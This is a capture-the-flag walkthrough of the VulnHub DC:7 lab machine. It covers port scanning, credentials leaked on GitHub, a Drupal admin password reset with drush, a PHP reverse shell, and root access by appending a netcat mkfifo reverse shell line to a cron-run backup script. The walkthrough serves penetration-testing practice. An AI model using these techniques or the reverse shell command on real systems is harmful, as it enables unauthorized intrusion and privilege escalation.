# DC:7 CTF Walkthrough (Vulnhub) 

###### <p align="center"> *This is official repository maintained by me*</center> </p>
###### <p align="center"> *[yigitdrbk](https://www.instagram.com/yigitdrbk/) *</center> </p>

DC:7 is a CTF created by DCAU. You can find the technical information about this CTF on the VulnHub page. First of all, make sure to download and install the correct OVA file from VulnHub. (https://download.vulnhub.com/dc/DC-7.zip).

This CTF is slightly more challenging than others. It requires understanding file permissions — such as who can execute or edit a file — and thinking outside the box, like searching for clues on the author’s GitHub page.
## 1 - Reconnaissance

I began with port scanning. Basic port and script scanning are crucial steps, especially if you’re not planning to use more advanced recon tools.

```bash
rustscan <machine_ip> or nmap -p- -vv- 
nmap -PN -sS -sV --script vuln -p 22,80 -oN finalscan
```

And then I checked the webpage. There was a note from author.

![DC7](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*WblfGgIAYVLZFdgJdqsDMQ.png "DC7")

I searched for the username “DC7USER” in a browser and found a GitHub account with the same name. This account had a single repository called “staffdb,” where I discovered dc7user’s credentials.

![DC7](https://miro.medium.com/v2/resize:fit:828/format:webp/1*8bIk5k-Bq89pHRs9ieBb6Q.png "DC7")

I first attempted to log in via the login panel, which was located at the top right corner of the page, but my attempt failed. Next, I tried using SSH with these credentials and successfully accessed the shell for the dc7user account.

## 2 - Exploiting

Inside the home directory, I found one file named “mbox” and a directory named “backups.” I started by reading the “mbox” file, which contained emails between the root user and dc7user, with a note mentioning a cron job on the machine.

![DC7](https://miro.medium.com/v2/resize:fit:828/format:webp/1*y8Un0haGIdf1n3VruXzVeg.png "DC7")

The cron job was located at /opt/scripts/backups.sh, and I had read access to this file. The backups.sh script simply deleted contents within the backups directory and refreshed it.

![DC7](https://miro.medium.com/v2/resize:fit:828/format:webp/1*1bmxHOdcMc-IL32g1DP2nA.png "DC7")

I noticed a drush command in the file, which allowed me to use it directly to change the admin password. Using the following simple command, I reset the admin password to "admin."

```bash
drush user-password admin --password=admin
```

`drush` is a command-line tool for managing Drupal CMS. After successfully changing the admin password, I logged in to access and manage the webpage.

## 3- Being admin on webpage

The admin interface was the standard Drupal management panel, which was somewhat complex at first glance. I navigated to the “Manage” section and selected “Content.” My goal was to insert a PHP reverse shell payload to obtain a reverse shell, but the webpage interpreted my PHP code as simple HTML.

If you have kali linux the reverse shell would be in “/usr/share/webshells” , but if you don’t have it you can just google the “pentestmonkey reverse shell”.

After that I download the php.tar.gz file from the original drupal page. So that I will run php code on my webpage. After that I just modify my php-reverse shell and started a netcat session on my local computer.

## 4-Getting root shell

And now I have a new netcat shell and I am a www-data user. Unlike the dc7user I can modify the backups.sh file and I can have root shell.

So the goal now is getting a shell with backups.sh cronjob. I searched the internet how I can add a line and get a shell. I found it on the pentestmonkey again.

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.4 1111 >/tmp/f' >> backups.sh
``` 

This is a cronjob so it won’t give you a reverse shell at the moments. After several minutes now I have shell in my netcat session as a root. So I can read the “theflag.txt”

![DC7](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XfU277VpLj8ps7bE5UfeSA.png "DC7")

Developer / Author: [yigitdrbk](https://www.instagram.com/yigitdrbk/)
